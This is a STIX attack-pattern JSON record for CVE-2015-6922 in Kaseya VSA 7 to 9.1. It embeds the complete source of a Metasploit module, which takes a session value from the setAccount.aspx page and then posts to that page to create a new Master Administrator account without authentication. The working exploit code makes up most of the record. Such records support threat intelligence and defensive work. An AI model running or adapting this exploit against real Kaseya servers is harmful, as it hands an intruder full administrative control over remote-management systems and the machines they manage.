{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--837dd338-7403-4023-98a6-14bc5285d6e2",
    "created": "2024-08-14T16:24:07.530427Z",
    "modified": "2024-08-14T16:24:07.530432Z",
    "name": "Kaseya VSA Master Administrator Account Creation",
    "description": " This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new Master Administrator account. Normally this page is only accessible via the localhost interface, but the application does nothing to prevent this apart from attempting to force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and v9.0.0.3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/kaseya_master_admin.rb",
            "external_id": "kaseya_master_admin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-6922"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Kaseya/kaseya-vsa-vuln-2.txt"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/bugtraq/2015/Sep/132"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kaseya VSA Master Administrator Account Creation',\n        'Description' => %q{\n          This module abuses the setAccount page on Kaseya VSA between 7 and 9.1 to create a new\n          Master Administrator account. Normally this page is only accessible via the localhost\n          interface, but the application does nothing to prevent this apart from attempting to\n          force a redirect. This module has been tested with Kaseya VSA v7.0.0.17, v8.0.0.10 and\n          v9.0.0.3.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2015-6922'],\n          ['ZDI', '15-448'],\n          ['URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Kaseya/kaseya-vsa-vuln-2.txt'],\n          ['URL', 'https://seclists.org/bugtraq/2015/Sep/132']\n        ],\n        'DisclosureDate' => '2015-09-23'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The Kaseya VSA URI', '/']),\n        OptString.new('KASEYA_USER', [true, 'The username for the new admin account', 'msf']),\n        OptString.new('KASEYA_PASS', [true, 'The password for the new admin account', 'password']),\n        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])\n      ]\n    )\n  end\n\n  def run\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),\n      'method' => 'GET'\n    })\n\n    if res && res.body && res.body.to_s =~ /ID=\"sessionVal\" name=\"sessionVal\" value='([0-9]*)'/\n      session_val = ::Regexp.last_match(1)\n    else\n      print_error('Failed to get sessionVal')\n      return\n    end\n\n    print_status(\"Got sessionVal #{session_val}, creating Master Administrator account\")\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'LocalAuth', 'setAccount.aspx'),\n      'method' => 'POST',\n      'vars_post' => {\n        'sessionVal' => session_val,\n        'adminName' => datastore['KASEYA_USER'],\n        'NewPassword' => datastore['KASEYA_PASS'],\n        'confirm' => datastore['KASEYA_PASS'],\n        'adminEmail' => datastore['EMAIL'],\n        'setAccount' => 'Create'\n      }\n    })\n\n    unless res && res.code == 302 && res.body && res.body.to_s.include?('/vsapres/web20/core/login.asp')\n      print_error('Master Administrator account creation failed')\n      return\n    end\n\n    print_good(\"Master Administrator account with credentials #{datastore['KASEYA_USER']}:#{datastore['KASEYA_PASS']} created\")\n\n    connection_details = {\n      module_fullname: fullname,\n      username: datastore['KASEYA_USER'],\n      private_data: datastore['KASEYA_PASS'],\n      private_type: :password,\n      workspace_id: myworkspace_id,\n      access_level: 'Master Administrator',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_details)\n    create_credential_and_login(connection_details)\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-23"
}